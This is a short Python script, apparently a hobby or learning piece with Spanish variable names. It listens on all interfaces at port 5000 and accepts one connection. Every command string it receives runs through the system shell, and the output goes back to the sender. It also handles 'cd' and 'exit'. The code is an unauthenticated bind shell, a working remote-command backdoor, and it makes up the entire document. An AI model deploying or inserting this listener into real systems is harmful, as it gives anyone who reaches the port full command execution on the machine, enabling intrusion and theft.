from socket import socket
from subprocess import getoutput
from os import chdir, getcwd
from time import sleep

server_address = ('0.0.0.0', 5000)

server_socket = socket()
server_socket.bind(server_address)
server_socket.listen(1)

client_socket, client_address = server_socket.accept()

estado = True
while estado:
    comando = client_socket.recv(4096).decode()

    if comando == 'exit':
        client_socket.close()
        server_socket.close()
        estado = False
    
    elif comando.split(" ")[0] == 'cd':
        chdir(" ".join(comando.split(" ")[1:]))
        client_socket.send("ruta actual: {}".format(getcwd()).encode())
    
    else :
        salida = getoutput(comando)
        client_socket.send(salida.encode())
    

    
